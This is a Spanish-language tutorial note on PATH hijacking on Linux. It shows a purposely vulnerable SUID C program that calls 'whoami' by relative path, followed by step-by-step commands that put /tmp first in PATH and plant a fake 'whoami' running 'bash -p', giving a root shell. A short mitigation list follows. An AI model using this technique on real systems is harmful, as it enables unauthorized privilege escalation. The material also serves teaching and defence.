- --
### 📝 **¿Qué es el PATH Hijacking?**
El **PATH Hijacking** es una técnica de ataque en sistemas Unix/Linux en la que el atacante manipula la variable de entorno `PATH` para **secuestar comandos del sistema**. Esto permite que los comandos legítimos sean reemplazados por versiones maliciosas, logrando la ejecución de código bajo ciertos contextos de privilegios.

---

### 💡 **¿Cómo Funciona?**
El sistema operativo utiliza el valor de la variable `PATH` para encontrar ejecutables. Al manipular el valor de `PATH`, podemos **priorizar directorios controlados por el atacante** para que el sistema ejecute primero nuestros binarios maliciosos en lugar de los originales.

---

## 📝 **Ejemplo de PATH Hijacking**

#### 💻 **Código C en la Máquina Víctima (con SUID)**
Imagina que tenemos acceso a un binario con SUID como el siguiente:
```c
#include <stdio.h>

int main() {
    setuid(0);  // Eleva privilegios a root
    printf("\n[*] Actualmente somos el siguiente usuario:\n\n");
    system("/usr/bin/whoami");
    printf("\n[+] Actualmente somos el siguiente usuario:\n\n");
    system("whoami");
    return 0;
}
```
- Utiliza la función `system()` para llamar al comando `whoami`.
- Al estar en modo SUID, ejecuta el comando con privilegios elevados.

---

## 🦠 **Explotación por el Atacante**

### 🔥 **1. Verificar el PATH Actual**
Primero, verificamos el valor actual de la variable `PATH`:
```bash
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

### 🧠 **2. Manipular el PATH para Secuestrar el Comando**
Modificamos el `PATH` para priorizar un directorio controlado:
```bash
export PATH=/tmp/:$PATH
```
- Esto hace que cualquier comando se busque primero en `/tmp/`.

### 💻 **3. Crear el Binario Malicioso**
Creamos un archivo en `/tmp/` con el mismo nombre que el comando legítimo:
```bash
echo "bash -p" > /tmp/whoami
chmod +x /tmp/whoami
```
- El archivo ejecutará una shell privilegiada (`bash -p`).

---

## 🚀 **4. Ejecutar el Binario Vulnerable**
Ahora ejecutamos el binario vulnerable con SUID:
```bash
./vulnerable_binary
```
- En lugar de ejecutar el comando original `whoami`, se ejecutará el script malicioso que invoca una shell privilegiada.

---

## 🛡️ **Medidas de Mitigación**
1. **Validar el PATH en los scripts críticos.**  
2. **Usar rutas absolutas en lugar de comandos simples.**  
3. **Restringir el uso de scripts SUID.**  
4. **Monitorear y auditar cambios en las variables de entorno.**  

---

💡 **Guarda esta guía en Obsidian para tener siempre a mano las técnicas de PATH Hijacking!** 🛠️